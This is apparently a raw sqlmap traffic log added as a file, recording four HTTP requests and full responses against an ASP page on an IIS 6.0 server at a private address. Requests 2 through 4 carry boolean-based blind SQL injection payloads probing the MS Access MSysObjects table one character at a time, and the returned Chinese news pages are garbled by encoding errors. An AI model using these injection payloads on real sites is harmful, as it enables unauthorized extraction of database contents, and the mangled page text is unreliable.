@@ -1,0 +1,489 @@
+HTTP request [#1]:
+GET /view.asp?n=133 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 192.168.100.142:81
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Connection: close
+
+HTTP response [#1] (200 OK):
+Content-length: 6560
+X-powered-by: ASP.NET
+Set-cookie: ASPSESSIONIDSABQCDCQ=LLMHDDDDNDOAMJECJEIPGIPN; path=/
+Uri: http://192.168.100.142:81/view.asp?n=133
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 16 Apr 2014 11:15:58 GMT
+Content-type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>�غ�����ֱѡ��ί���ѡ�ٴ��Բ����������Ȩ���Ʊ��ѡ_�����ط�����ϵͳV1.0</title>
+
+<link href="gnc.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<table width="780" height="24" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_02.gif" bgcolor="#f8f8f8">
+  <tr>
+    <td align="left" style="color:#FF0000;">��<script language=JavaScript>
+ today=new Date();
+ function initArray(){
+   this.length=initArray.arguments.length
+   for(var i=0;i<this.length;i++)
+   this[i+1]=initArray.arguments[i]  }
+   var d=new initArray(
+     "������",
+     "����һ",
+     "���ڶ�",
+     "������",
+     "������",
+     "������",
+     "������");
+document.write(
+     today.getYear(),"��",
+     today.getMonth()+1,"��",
+     today.getDate(),"��")
+</script>��<script language=JavaScript>document.write(
+	 d[today.getDay()+1]);</script></td>
+    <td align="right"><span onclick="var strHref=window.location.href;this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.photoshi.cn');"><a href="#" style="cursor:pointer;">��Ϊ��ҳ</a></span>��<a title="��ַ" href="#" onclick="javascript:window.external.AddFavorite('http://www.photoshi.cn','��Ӱ������')" style="cursor:pointer;">�ղر�վ</A>��<a href="email.asp">���������</a>��<a href="about.asp">��ϵ����</a> �</td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#f41226">
+  <tr>
+    <td height="168" align="left"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="780" height="168">
+      <param name="movie" value="uploadfile/SWF/2008-10/7-18375-dd.swf " />
+      <param name="quality" value="high" /><param name="SCALE" value="exactfit" />
+      <embed src="uploadfile/SWF/2008-10/7-18375-dd.swf " width="780" height="168" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" scale="exactfit"></embed>
+    </object></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_06.gif" bgcolor="#d91819">
+  <tr>
+    <td height="34" align="left"><ul id="nav">
+      <li ><a href="index.asp">��վ��ҳ</a></li>
+      <li ><a href="ml.asp">������ũ</a></li>
+      <li ><a href="news.asp">������̬</a></li>
+      <li ><a href="ny.asp">�۹�����</a></li>
+      <li ><a href="jc.asp">��������</a></li>
+      <li ><a href="gn.asp">Զ�̽���</a></li>
+      <li ><a href="xn.asp">��ũ�彨��</a></li>
+      <li ><a href="xx.asp">��������</a></li>
+      <li ><a href="zy.asp">��������</a></li>
+      <li ><a href="ts.asp">��ɽ֮ʯ</a></li>
+      <li ><a href="qt.asp">����</a></li>
+    </ul></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td width="5" rowspan="2" align="left" valign="top">�</td>    
+    <td height="27" align="left" valign="top" class="left_td_aa"> ����ǰ���ڵ�λ�� : ��ҳ > ������̬ > ��ũ���� </td>
+    <td width="5" rowspan="2">�</td>
+  </tr>
+  <tr>
+    <td height="400" valign="top" class="left_td_b">      
+<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="23%">�</td>
+    <td width="74%">�</td>
+    <td width="3%">�</td>
+  </tr>
+  <tr>
+    <td height="30" colspan="3" align="center" style=" font-size:12pt; font-weight:bold;">�غ�����ֱѡ��ί���ѡ�ٴ��Բ����������Ȩ���Ʊ��ѡ</td>
+    </tr>
+  <tr>
+    <td height="25" bgcolor="#F7F7F7">�</td>
+    <td height="25" align="right" bgcolor="#F7F7F7" style="color:#333333;">�����ˣ�admin �������(<font color="#FF0000">176</font>) �������ڣ�2008-12-23�14:25:02</td>
+    <td height="25" bgcolor="#F7F7F7">�</td>
+  </tr>
+</table>
+<div align="left" style="padding:8px; line-height:24px; font-size:11pt;">
+<p style="text-align: center"><img height="341" alt="" width="455" src="/admin_uploadfile/20081208114633958.jpg" />���</p>
+<p style="text-align: left">��� 2008��11��18�����磬�غ�����ֱѡ��ί���ѡ�ٴ������Ȫ��ѧŷ������˳�����С�ȫ��1109����Ա����ѡ��ͶƱ���غ��򵳹�ί��ǡ���ί�������Ȩ����995Ʊ��Ʊ��ѡ����ί��ί����֯����������Ȩ�����˴�ί�ḱ��ϯ����ȫ������Э����ϯ�����������ϯѡ�ٴ�ᡣ</p>
+<p style="text-align: center"><img height="346" alt="" width="461" src="/admin_uploadfile/IMG_0335(2).jpg" /></p>
+<p style="text-align: left">��� 9��30�֣�ѡ�ٴ����ʽ��ʼ����ׯ�ϵĹ������Ȩ�ꡢ������λ��ѡ�˳�ǩ�������ݽ�˳�򲢿�ʼ��ְ�ݽ���“��������ǣ�����㵱ѡΪ�غ���ĵ�ί��ǣ�����ν�һ���Ż�ũ�嵳Ա����ṹ�������Ϊ�ϵ�Ա�ṩ���õķ���”һλ�ϵ�Ավ��������ո��ݽ���ϵ���Ȩ�����ʵ���“��һ��һ����ѧ���з�չ��Ա���������¸�������������Ա������ר�������𣬶������ϵ�Ա��������……”��Ȩ��Ļش�����̨�����ҵ��������������������Ա����Ȩ����������ʣ����õ�������������Ļش������ݽ���������ϡ�ͨ����ѡ�ٰ취�ͼࡢ��ƱԱ����������ѡƱ������Ա�ǵ����С���Ա�����Լ�����ĺ�ѡ�����ֺ����Ϸ��ţ��ڹ�����Ա�������£���Ʊ��Ͷ�����Լ�ׯ�ϵ�һƱ��<br />
+��� ѡ�ٽ���������Ȩ������ί���µ�ѡ�İغ���ί�����Ȩ���ʾ�����ҵ�ף�أ���ϣ���غ���ĵ�Ա�ɲ�Ⱥ��Ҫ�Ž�һ�ģ�Ⱥ��Ⱥ�����ƶ�ȫ�򾭼��ֺ��ֿ췢չ��ϣ����Ȩ�겻�����У���ְ���𣬽�һ����ǿ��չ��ʶ��Ϊ����ʶ�Լ�������ʶ�����쵳Ա�ɲ�Ⱥ��Ϊ�ƽ�ȫ��չ��Ŭ���ܶ���</p>
+</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td colspan="4" height="8"> </td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td height="6" align="left" bgcolor="#df0000"></td>
+  </tr>
+  <tr>
+    <td height="144" align="center" valign="top" ><div align="center" style="line-height:5px; margin-top:12px;">��������<a href="http://www.photoshi.cn">��</a>
+      �<a href="http://www.photoshi.cn" target="_blank"><font color="#996633">��ɴ��Ӱ������</font></a></div>
+		  <div align="center" style="line-height:22px; margin-top:12px;">������ܲ���վV1.0����<br>
+������Ч��: IE6.0,1024x768�ֱ���<br>
+</div></td>
+  </tr>
+</table>
+</body>
+</html>
+
+############################################################################
+
+HTTP request [#2]:
+GET /view.asp?n=133%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2051 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 192.168.100.142:81
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Cookie: ASPSESSIONIDSABQCDCQ=LLMHDDDDNDOAMJECJEIPGIPN
+Connection: close
+
+HTTP response [#2] (200 OK):
+Content-length: 4270
+X-powered-by: ASP.NET
+Uri: http://192.168.100.142:81/view.asp?n=133%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2051
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 16 Apr 2014 11:15:58 GMT
+Content-type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>_�����ط�����ϵͳV1.0</title>
+
+<link href="gnc.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<table width="780" height="24" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_02.gif" bgcolor="#f8f8f8">
+  <tr>
+    <td align="left" style="color:#FF0000;">��<script language=JavaScript>
+ today=new Date();
+ function initArray(){
+   this.length=initArray.arguments.length
+   for(var i=0;i<this.length;i++)
+   this[i+1]=initArray.arguments[i]  }
+   var d=new initArray(
+     "������",
+     "����һ",
+     "���ڶ�",
+     "������",
+     "������",
+     "������",
+     "������");
+document.write(
+     today.getYear(),"��",
+     today.getMonth()+1,"��",
+     today.getDate(),"��")
+</script>��<script language=JavaScript>document.write(
+	 d[today.getDay()+1]);</script></td>
+    <td align="right"><span onclick="var strHref=window.location.href;this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.photoshi.cn');"><a href="#" style="cursor:pointer;">��Ϊ��ҳ</a></span>��<a title="��ַ" href="#" onclick="javascript:window.external.AddFavorite('http://www.photoshi.cn','��Ӱ������')" style="cursor:pointer;">�ղر�վ</A>��<a href="email.asp">���������</a>��<a href="about.asp">��ϵ����</a> �</td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#f41226">
+  <tr>
+    <td height="168" align="left"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="780" height="168">
+      <param name="movie" value="uploadfile/SWF/2008-10/7-18375-dd.swf " />
+      <param name="quality" value="high" /><param name="SCALE" value="exactfit" />
+      <embed src="uploadfile/SWF/2008-10/7-18375-dd.swf " width="780" height="168" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" scale="exactfit"></embed>
+    </object></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_06.gif" bgcolor="#d91819">
+  <tr>
+    <td height="34" align="left"><ul id="nav">
+      <li ><a href="index.asp">��վ��ҳ</a></li>
+      <li ><a href="ml.asp">������ũ</a></li>
+      <li ><a href="news.asp">������̬</a></li>
+      <li ><a href="ny.asp">�۹�����</a></li>
+      <li ><a href="jc.asp">��������</a></li>
+      <li ><a href="gn.asp">Զ�̽���</a></li>
+      <li ><a href="xn.asp">��ũ�彨��</a></li>
+      <li ><a href="xx.asp">��������</a></li>
+      <li ><a href="zy.asp">��������</a></li>
+      <li ><a href="ts.asp">��ɽ֮ʯ</a></li>
+      <li ><a href="qt.asp">����</a></li>
+    </ul></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td width="5" rowspan="2" align="left" valign="top">�</td>    
+    <td height="27" align="left" valign="top" class="left_td_aa"> ����ǰ���ڵ�λ�� : ��ҳ >  </td>
+    <td width="5" rowspan="2">�</td>
+  </tr>
+  <tr>
+    <td height="400" valign="top" class="left_td_b">      <div align="left" style="padding:10px;">
+Ŀǰ����Ŀ��û��¼�����ݣ����Ժ��ٷ���</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td colspan="4" height="8"> </td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td height="6" align="left" bgcolor="#df0000"></td>
+  </tr>
+  <tr>
+    <td height="144" align="center" valign="top" ><div align="center" style="line-height:5px; margin-top:12px;">��������<a href="http://www.photoshi.cn">��</a>
+      �<a href="http://www.photoshi.cn" target="_blank"><font color="#996633">��ɴ��Ӱ������</font></a></div>
+		  <div align="center" style="line-height:22px; margin-top:12px;">������ܲ���վV1.0����<br>
+������Ч��: IE6.0,1024x768�ֱ���<br>
+</div></td>
+  </tr>
+</table>
+</body>
+</html>
+
+############################################################################
+
+HTTP request [#3]:
+GET /view.asp?n=133%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2048 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 192.168.100.142:81
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Cookie: ASPSESSIONIDSABQCDCQ=LLMHDDDDNDOAMJECJEIPGIPN
+Connection: close
+
+HTTP response [#3] (200 OK):
+Content-length: 4270
+X-powered-by: ASP.NET
+Uri: http://192.168.100.142:81/view.asp?n=133%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%2048
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 16 Apr 2014 11:15:58 GMT
+Content-type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>_�����ط�����ϵͳV1.0</title>
+
+<link href="gnc.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<table width="780" height="24" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_02.gif" bgcolor="#f8f8f8">
+  <tr>
+    <td align="left" style="color:#FF0000;">��<script language=JavaScript>
+ today=new Date();
+ function initArray(){
+   this.length=initArray.arguments.length
+   for(var i=0;i<this.length;i++)
+   this[i+1]=initArray.arguments[i]  }
+   var d=new initArray(
+     "������",
+     "����һ",
+     "���ڶ�",
+     "������",
+     "������",
+     "������",
+     "������");
+document.write(
+     today.getYear(),"��",
+     today.getMonth()+1,"��",
+     today.getDate(),"��")
+</script>��<script language=JavaScript>document.write(
+	 d[today.getDay()+1]);</script></td>
+    <td align="right"><span onclick="var strHref=window.location.href;this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.photoshi.cn');"><a href="#" style="cursor:pointer;">��Ϊ��ҳ</a></span>��<a title="��ַ" href="#" onclick="javascript:window.external.AddFavorite('http://www.photoshi.cn','��Ӱ������')" style="cursor:pointer;">�ղر�վ</A>��<a href="email.asp">���������</a>��<a href="about.asp">��ϵ����</a> �</td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#f41226">
+  <tr>
+    <td height="168" align="left"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="780" height="168">
+      <param name="movie" value="uploadfile/SWF/2008-10/7-18375-dd.swf " />
+      <param name="quality" value="high" /><param name="SCALE" value="exactfit" />
+      <embed src="uploadfile/SWF/2008-10/7-18375-dd.swf " width="780" height="168" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" scale="exactfit"></embed>
+    </object></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_06.gif" bgcolor="#d91819">
+  <tr>
+    <td height="34" align="left"><ul id="nav">
+      <li ><a href="index.asp">��վ��ҳ</a></li>
+      <li ><a href="ml.asp">������ũ</a></li>
+      <li ><a href="news.asp">������̬</a></li>
+      <li ><a href="ny.asp">�۹�����</a></li>
+      <li ><a href="jc.asp">��������</a></li>
+      <li ><a href="gn.asp">Զ�̽���</a></li>
+      <li ><a href="xn.asp">��ũ�彨��</a></li>
+      <li ><a href="xx.asp">��������</a></li>
+      <li ><a href="zy.asp">��������</a></li>
+      <li ><a href="ts.asp">��ɽ֮ʯ</a></li>
+      <li ><a href="qt.asp">����</a></li>
+    </ul></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td width="5" rowspan="2" align="left" valign="top">�</td>    
+    <td height="27" align="left" valign="top" class="left_td_aa"> ����ǰ���ڵ�λ�� : ��ҳ >  </td>
+    <td width="5" rowspan="2">�</td>
+  </tr>
+  <tr>
+    <td height="400" valign="top" class="left_td_b">      <div align="left" style="padding:10px;">
+Ŀǰ����Ŀ��û��¼�����ݣ����Ժ��ٷ���</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td colspan="4" height="8"> </td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td height="6" align="left" bgcolor="#df0000"></td>
+  </tr>
+  <tr>
+    <td height="144" align="center" valign="top" ><div align="center" style="line-height:5px; margin-top:12px;">��������<a href="http://www.photoshi.cn">��</a>
+      �<a href="http://www.photoshi.cn" target="_blank"><font color="#996633">��ɴ��Ӱ������</font></a></div>
+		  <div align="center" style="line-height:22px; margin-top:12px;">������ܲ���վV1.0����<br>
+������Ч��: IE6.0,1024x768�ֱ���<br>
+</div></td>
+  </tr>
+</table>
+</body>
+</html>
+
+############################################################################
+
+HTTP request [#4]:
+GET /view.asp?n=133%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%201 HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 192.168.100.142:81
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Cookie: ASPSESSIONIDSABQCDCQ=LLMHDDDDNDOAMJECJEIPGIPN
+Connection: close
+
+HTTP response [#4] (200 OK):
+Content-length: 4270
+X-powered-by: ASP.NET
+Uri: http://192.168.100.142:81/view.asp?n=133%20AND%20ASCW%28MID%28%28SELECT%20IIF%28LEN%28CVAR%28COUNT%28Name%29%29%29=0%2CCHR%2832%29%2CCVAR%28COUNT%28Name%29%29%29%20FROM%20MSysObjects%20WHERE%20Type=1%29%2C1%2C1%29%29%20%3E%201
+Server: Microsoft-IIS/6.0
+Connection: close
+Cache-control: private
+Date: Wed, 16 Apr 2014 11:15:58 GMT
+Content-type: text/html
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+
+<title>_�����ط�����ϵͳV1.0</title>
+
+<link href="gnc.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<table width="780" height="24" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_02.gif" bgcolor="#f8f8f8">
+  <tr>
+    <td align="left" style="color:#FF0000;">��<script language=JavaScript>
+ today=new Date();
+ function initArray(){
+   this.length=initArray.arguments.length
+   for(var i=0;i<this.length;i++)
+   this[i+1]=initArray.arguments[i]  }
+   var d=new initArray(
+     "������",
+     "����һ",
+     "���ڶ�",
+     "������",
+     "������",
+     "������",
+     "������");
+document.write(
+     today.getYear(),"��",
+     today.getMonth()+1,"��",
+     today.getDate(),"��")
+</script>��<script language=JavaScript>document.write(
+	 d[today.getDay()+1]);</script></td>
+    <td align="right"><span onclick="var strHref=window.location.href;this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.photoshi.cn');"><a href="#" style="cursor:pointer;">��Ϊ��ҳ</a></span>��<a title="��ַ" href="#" onclick="javascript:window.external.AddFavorite('http://www.photoshi.cn','��Ӱ������')" style="cursor:pointer;">�ղر�վ</A>��<a href="email.asp">���������</a>��<a href="about.asp">��ϵ����</a> �</td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#f41226">
+  <tr>
+    <td height="168" align="left"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="780" height="168">
+      <param name="movie" value="uploadfile/SWF/2008-10/7-18375-dd.swf " />
+      <param name="quality" value="high" /><param name="SCALE" value="exactfit" />
+      <embed src="uploadfile/SWF/2008-10/7-18375-dd.swf " width="780" height="168" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" scale="exactfit"></embed>
+    </object></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" background="images/gnc_06.gif" bgcolor="#d91819">
+  <tr>
+    <td height="34" align="left"><ul id="nav">
+      <li ><a href="index.asp">��վ��ҳ</a></li>
+      <li ><a href="ml.asp">������ũ</a></li>
+      <li ><a href="news.asp">������̬</a></li>
+      <li ><a href="ny.asp">�۹�����</a></li>
+      <li ><a href="jc.asp">��������</a></li>
+      <li ><a href="gn.asp">Զ�̽���</a></li>
+      <li ><a href="xn.asp">��ũ�彨��</a></li>
+      <li ><a href="xx.asp">��������</a></li>
+      <li ><a href="zy.asp">��������</a></li>
+      <li ><a href="ts.asp">��ɽ֮ʯ</a></li>
+      <li ><a href="qt.asp">����</a></li>
+    </ul></td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td width="5" rowspan="2" align="left" valign="top">�</td>    
+    <td height="27" align="left" valign="top" class="left_td_aa"> ����ǰ���ڵ�λ�� : ��ҳ >  </td>
+    <td width="5" rowspan="2">�</td>
+  </tr>
+  <tr>
+    <td height="400" valign="top" class="left_td_b">      <div align="left" style="padding:10px;">
+Ŀǰ����Ŀ��û��¼�����ݣ����Ժ��ٷ���</div>
+
+    </td>
+  </tr>
+  <tr>
+    <td colspan="4" height="8"> </td>
+  </tr>
+</table>
+<table width="780" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
+  <tr>
+    <td height="6" align="left" bgcolor="#df0000"></td>
+  </tr>
+  <tr>
+    <td height="144" align="center" valign="top" ><div align="center" style="line-height:5px; margin-top:12px;">��������<a href="http://www.photoshi.cn">��</a>
+      �<a href="http://www.photoshi.cn" target="_blank"><font color="#996633">��ɴ��Ӱ������</font></a></div>
+		  <div align="center" style="line-height:22px; margin-top:12px;">������ܲ���վV1.0����<br>
+������Ч��: IE6.0,1024x768�ֱ���<br>
+</div></td>
+  </tr>
+</table>
+</body>
+</html>
+
+############################################################################
+
